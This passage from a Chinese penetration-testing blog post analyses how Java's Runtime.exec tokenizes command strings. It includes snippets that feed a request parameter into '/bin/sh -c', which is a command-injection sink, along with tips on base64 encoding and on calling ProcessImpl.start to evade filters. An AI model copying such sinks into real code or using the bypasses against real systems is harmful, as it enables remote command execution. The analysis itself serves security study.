style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] &lt;/span&gt;&lt;span style=\&quot;color:#E36209;--shiki-dark:#FFAB70\&quot;&gt;arg&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;throws&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        String command&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        Process proc &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Runtime.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;getRuntime&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;().&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        InputStream in &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; proc.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;getInputStream&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        BufferedReader br &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; new&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; BufferedReader&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;new&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; InputStreamReader&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(in, &lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;\&quot;UTF8\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;));&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        String line &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;        while&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;((line&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;br.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;readLine&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;())&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;!=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;            System.out.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;println&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(line);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;跟进 java.lang.Runtime#exec 的构造方法，这里要感谢phith0n师傅提出的疑问，让我补充完整这篇文章，下面话题回来，exec的构造方法有以下几种情况，其实根据传入的变量我们大概可以区分的了，一个是根据String command，也就是直接传入一个字符串。另一个是根据String cmdarray[]，也就是传入一个数组。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;java\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String command) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String command, &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] envp) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command, envp, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String cmdarray[]) throws IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;        return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(cmdarray, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;     }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] cmdarray, &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] envp) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(cmdarray, envp, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;而根据前面代码中，我们传入的命令是如下所示：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;所以会进入&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Process exec(String command)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这个构造方法进行处理，跟进这个方法，发现最后返回&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exec(command, null, null)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public Process exec(String command) throws IOException {        return exec(command, null, null);    }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;继续跟进这个exec方法，看看这个方法的实现。这里代码实例化了StringTokenizer类，并且传入了我们要执行的command命令，简单翻译一下注释：为指定的字符串构造一个字符串标记器。也就是说StringTokenizer这个类会为特殊字符打上tag之类的东西。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/22.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n我们继续往下看，经过StringTokenizer类处理之后会返回一个cmdarray[]，而这里的处理实际上是根据空格针对命令进行了分割，至于为什么结果要是一个array数组，我们下面会接着说。&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/23.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n我们发现经过一系列的处理，最后又有一个return exec 的处理。继续跟进这个exec的处理，我们可以看到这里最后实例化ProcessBuilder来处理我们传入的cmdarray。到这里实际上可以清楚了Runtime.getRuntime().exec()的底层实际上也是ProcessBuilder。&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public Process exec(String\\[\\] cmdarray, String\\[\\] envp, File dir)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;       throws IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;       return new ProcessBuilder(cmdarray)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;          .environment(envp)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;           .directory(dir)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;           .start();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;我们知道ProcessBuilder.start方法是命令执行，那么跟进这个start我们发现，首先prog获取cmdarray[0]也就是我们的/bin/sh，然后判断security是否为null，如果不为null就会校验checkExec。&lt;/p&gt;\n&lt;p&gt;然后继续往下走，这里调用java.lang.ProcessImpl.start。&lt;/p&gt;\n&lt;p&gt;进入之后我们就可以看到最后是调用java.lang.UnixProcess这个类来执行命令，而且我们发现执行命令的时候实际上是根据cmdarray[0]来判断用什么命令。而在java.lang.UnixProcess这个类里面是调用forkAndExec来为命令创建环境等操作。我们看到当前断点pid是2653，而这里确实起了一个sh的进程。&lt;/p&gt;\n&lt;p&gt;这样看可能还不够明显，因为我们知道/bin/sh -c echo 111 &gt; 3.txt在bash命令行下也不会正常执行成功，命令行下需要/bin/sh -c “echo 111 &gt; 3.txt”，看这两段代码的命令执行的效果。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;首先先看\n&lt;code&gt;String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;&lt;/code&gt;\n按照前面的分析，经过StringTokenizer这个类进行拆分之后变成了{“/bin/sh”,“-c”,\&quot;\&quot;echo”,“111”、”&gt;”,“3.txt\&quot;\&quot;}。&lt;/p&gt;\n&lt;p&gt;而当前内存开辟一个12473进程，并且确实12473执行sh命令。&lt;/p&gt;\n&lt;p&gt;但是我们发现，经过StringTokenizer这类拆分之后，命令完全变了一个味道，语义完全变了，并不是我们想要的结果，那我们再看看&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;的结果。因为我们传入的是array数组类型，这里直接将命令直接带入了ProcessBuilder进行处理，前面完全没有经过StringTokenizer这个类的拆分。也就是他完整的保存了我想要的语义。&lt;/p&gt;\n&lt;p&gt;也就是说getRuntime().exec()如果直接传入字符串会经过StringTokenizer的分割，进而破坏其原本想要表达的意思。&lt;/p&gt;\n&lt;p&gt;下面这段代码是否存在命令执行的问题，要是在PHP下，我会斩钉截铁的说是，但是回到java环境下，我们发现 | 等一些特殊符号没办法使用，而且传入的是字符串，遇到空格会被StringTokenizer进行切割，所以实际上下面这段代码是没办法使用的。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;url\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String cmdstr = \&quot;ping \&quot;+ url;Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;再来一段代码，能够执行命令，但是很受限，我们知道命令根据cmdarray[0]来确认以什么命令环境启动，这里确实以/bin/sh启动了，但是后面的命令执行的时候存在问题，它仅能执行单条命令，拼接不了相关参数。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;cmd\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String cmdstr = \&quot;/bin/sh -c \&quot;+ cmd;Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;最后再来一段代码，下面这段代码才会是java下命令执行的完全体。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;cmd\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] cmdstr = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, str };Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;后面我翻到一篇文章，实际上也是差不多这个情况，实际上也是这个StringTokenizer这个类针对命令进行处理可能会造成非预期的结果。&lt;/p&gt;\n&lt;p&gt;最后还有一个问题，为什么一定要将命令切割成为数组，原因是因为ProcessBuilder，看看他的构造方法。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public ProcessBuilder(String... command) {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command = new ArrayList&amp;#x3C;&gt;(command.length);        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    for (String arg : command)            &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command.add(arg);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public ProcessBuilder(List&amp;#x26;lt;String&amp;#x26;gt; command) {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    if (command == null)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    throw new NullPointerException();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command = command;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;实际上它是要求 Array 类型或者 List 类型，如果我们要执行下图中的代码是不行的。&lt;/p&gt;\n&lt;p&gt;原因在于我们传入的类型不对，我们前面说过命令执行是根据cmdarray[0]，确认命令启动环境，这里自然找不到我们要启动的命令。&lt;/p&gt;\n&lt;p&gt;所以Java下的命令稍微改造一下代码就好。&lt;/p&gt;\n&lt;p&gt;还有一种方式就是用编码，linux下可以用bash的base64编码来解决这个特殊字符的问题。&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/24.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n这里在小提一下如果遇到命令执行过滤了ProcessBuilder和getRuntime，可以考虑一下java.lang.ProcessImpl.start&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;小结\&quot;&gt;小结&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#小结\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;其实java已经尽量规避命令执行的安全问题，JDK沙盒机制会进行checkExec，执行命令的机制就是仅仅检查并执行命令数组中的第一个，而分隔符后面的所有东西都是默认为被执行程序的参数，而分隔符后面的所有东西都是默认为被执行程序的参数，这也是我们前文一直聊的内容。所以getRuntime().exec()通过传入字符串执行命令的时候，应该尽量避免使用空格，用了空格可能会改变这条命令本身想要表达的意思。&lt;/p&gt;\n&lt;p&gt;所以在java下如果遇到复杂的命令执行，且参数只能如下所示，且只有一个位置可以控制的话，建议使用base64的编码方式，windows下可以使用powershell的base64。&lt;/p&gt;\n&lt;p&gt;java的反序列化框架利用框架yso，以及一些shiro这类反序列化导致的命令执行实际上很多是用了getRuntime来达到命令执行的目的，且就像我们上面说的，可控位置比较固定，执行复杂命令会出现执行不了。&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;前言&quot;],&quot;text&quot;:[0,&quot;前言&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;差别&quot;],&quot;text&quot;:[0,&quot;差别&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;小结&quot;],&quot;text&quot;:[0,&quot;小结&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;JAVA奇怪的命令执行&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;java&quot;],[0,&quot;漏洞&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;i